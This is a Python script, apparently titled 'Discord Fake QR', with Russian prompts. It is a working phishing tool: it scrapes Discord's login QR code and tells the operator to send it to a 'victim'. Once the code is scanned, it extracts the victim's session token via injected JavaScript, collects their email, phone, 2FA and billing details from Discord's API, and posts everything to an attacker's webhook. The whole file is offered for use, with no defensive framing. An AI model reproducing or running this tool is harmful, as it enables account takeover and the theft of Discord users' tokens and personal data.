import os
import random
import json
import base64
import requests

from time import sleep
from colorama import Fore
from PIL import Image
from bs4 import BeautifulSoup
from selenium import webdriver, common

heads = [
    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    },
    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },
    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },
    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
    },
    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
    },
    {
       "Content-Type": "application/json",
       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
]
browsers = {
    1: {
        'name': 'Firefox',
        'path': 'driver//geckodriver.exe',
        'driver_filename': 'geckodriver.exe',
        'download_link': 'https://github.com/mozilla/geckodriver/releases'
    },
    2: {
        'name': 'Chrome',
        'path': 'driver//chromedriver.exe',
        'driver_filename': 'chromedriver.exe',
        'download_link': 'https://sites.google.com/chromium.org/driver/downloads?authuser=0'
    },
    3: {
        'name': 'Opera',
        'path': 'driver//operadriver.exe',
        'driver_filename': 'operadriver.exe',
        'download_link': 'https://github.com/operasoftware/operachromiumdriver/releases'
    },
    4: {
        'name': 'Microsoft Edge',
        'path': 'driver//edgedriver.exe',
        'driver_filename': 'edgedriver.exe',
        'download_link': 'https://developer.microsoft.com/en-us/microsoft-edge/tools/webdriver/'
    }
}

y = Fore.LIGHTYELLOW_EX
b = Fore.LIGHTBLUE_EX
w = Fore.LIGHTWHITE_EX


def getheaders(token=None):
    headers = random.choice(heads)
    if token:
        headers.update({"Authorization": token})
    return headers


def logo_qr():
    # paste the discord logo into the QR code
    im1 = Image.open('temp_qrcode_clear.png', 'r')
    im2 = Image.open('discord_ico.png', 'r')
    im1.paste(im2, (60, 55), im2)
    im1.save('qrcode_clear.png', quality=100)


def paste_template():
    # add border to code
    im1 = Image.open('background.png', 'r')
    im2 = Image.open('qrcode_clear.png', 'r')
    im1.paste(im2, (20, 20))
    im1.save('output.png', quality=100)


def try_remove(path: str):
    try:
        os.remove(path)
    except Exception as e:
        print(e)


def main(hook):
    browser_name = browsers[browser_number].get('name')
    if browser_name == 'Firefox':
        opts = webdriver.FirefoxOptions()
        opts.set_preference('detach', True)
        browser_class = webdriver.Firefox
    elif browser_name == 'Chrome':
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        browser_class = webdriver.Chrome
    elif browser_name == 'Opera':  # Opera
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        browser_class = webdriver.Opera
    elif browser_name == 'Microsoft Edge':
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        browser_class = webdriver.Edge

    try:
        driver = browser_class(options=opts, executable_path=r'driver/geckodriver.exe')
    except common.exceptions.SessionNotCreatedException as e:
        print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Ошибка: {e.msg}")
        input(f"{y}[{b}#{y}]{w} Нажмите ENTER для перезапуска")
        os.system("cls")
        return
    driver.get('https://discord.com/login')
    sleep(3)
    page_source = driver.page_source
    soup = BeautifulSoup(page_source, features='html.parser')

    #Create the QR code
    div = soup.find('div', {'class': 'qrCode-2R7t9S'})
    qr_code = div.find('img')['src']
    file = os.path.join(os.getcwd(), 'temp_qrcode_clear.png')
    img_data = base64.b64decode(qr_code.replace('data:image/png;base64,', ''))

    with open(file,'wb') as handler:
        handler.write(img_data)
    discord_login = driver.current_url
    logo_qr()
    paste_template()

    path = os.getcwd() + "\\output"
    if not os.path.exists(path):
        os.mkdir(path)
    os.replace(os.getcwd() + "\\output.png", path + "\\output.png")
    print(f"\n{y}[{w}+{y}]{w} Информация: \n")
    print(f'          {y}[{Fore.LIGHTRED_EX }!{y}]{w} Отправьте QR код жертве, не закрывая это окно и браузер!')
    print(f'          {y}[{Fore.LIGHTGREEN_EX }!{y}]{w} QR код сохранён в ' + path)

    try_remove("temp_qrcode_clear.png")
    try_remove("qrcode_clear.png")
    os.system(f'start {os.path.realpath(os.getcwd() + "/output/")}')

    #Waiting to scan
    while True:
        if discord_login != driver.current_url:
            token = driver.execute_script('''
    token = (webpackChunkdiscord_app.push([
        [''],
        {},
        e=>{m=[];for(
                let c in e.c)
                m.push(e.c[c])}
        ]),m)
        .find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
    return token;
                ''')
            j = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)).json()
            user = j["username"] + "#" + str(j["discriminator"])
            email = j["email"]
            mfa = j['mfa_enabled']
            verified = j['verified']
            phone = j["phone"] if j["phone"] else "Телефон не привязан"
            url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.png'
            nitro_data = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=getheaders(token)).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v9/users/@me/billing/payment-sources", headers=getheaders(token)).text)) > 0)
            embed = {
                "avatar_url": url,
                "embeds": [
                    {
                        "author": {
                            "name": "Fake QR Code",
                            "url": "https://discord.gg/2TNmNGWEmY",
                            "icon_url": url
                        },
                        "description": f"**{user}** отсканировал код!\n\n**Покупки:** {billing}\n**Нитро:** {has_nitro}\n**Почта:** {email}\n**Телефон:** {phone}\n**2-х факторная аутентификация:** {mfa}\n**Подтверждён:** {verified}\n**[Аватарка]({url})**",
                        "fields": [
                            {
                            "name": "**Токен:**",
                            "value": f"```fix\n{token}```",
                            "inline": False
                            }
                        ],
                        "color": 0x000001,
                        "footer": {
                        "text": "@ItzRxg3#0001 x @Astraa#6100"
                        }
                    }
                ]
            }
            requests.post(hook, json=embed)
            break
    driver.quit()
    try_remove("geckodriver.log")
    try_remove("output\\output.png")
    input(f"\n{y}[{b}#{y}]{w} Нажмите ENTER чтобы сгенерировать новый код...")
    print()

print(b + f""" _____     _           ___  ____  
|  ___|_ _| | _____   / _ \\|  _ \\ 
| |_ / _` | |/ / _ \\ | | | | |_) |
{y}|  _| (_| |   <  __/ | |_| |  _ < 
|_|  \\__,_|_|\\_\\___|  \\__\\_\\_| \\_\\""")
print(w)
print('=======================================')
print('= https://github.com/ProgrammerPython =')
print('=     https://github.com/AstraaDev    =')
print('=        Discord    Fake   QR         =')
print('=           @Rxg3 x @a5traa           =')
print('=======================================')

browser_number = 0
for i, browser_dict in enumerate(browsers.values(), start=1):
    print(f'{y}[{w}{i}{y}]{w} - {b}' + browser_dict.get("name", "Имя не указано"))

while browser_number not in browsers.keys():
    try:
        browser_number = int(input(w + 'Выберите свой браузер: '))
    except (ValueError, TypeError):
        pass
    if browser_number in browsers.keys():
        exists = False
        browser_data = browsers[browser_number]
        while not exists:
            exists = os.path.exists(browser_data.get('path'))
            if not exists:
                name = browser_data.get('name')
                driver_name = browser_data.get('driver_filename')
                print(f'{y}[{b}#{y}]{w} Драйвер для {name} отсуствует!')
                print(f'{y}[{b}#{y}]{w} Ссылка для скачивания: ' + browser_data.get('download_link'))
                input(f'{y}[{b}#{y}]{w} Переименуйте его в {driver_name} и поместите в папку driver, а затем нажмите ENTER..\n')

webhooklink = input(f"{y}[{b}#{y}]{w} Вебхук: ")
print()

while 1:
    main(webhooklink)
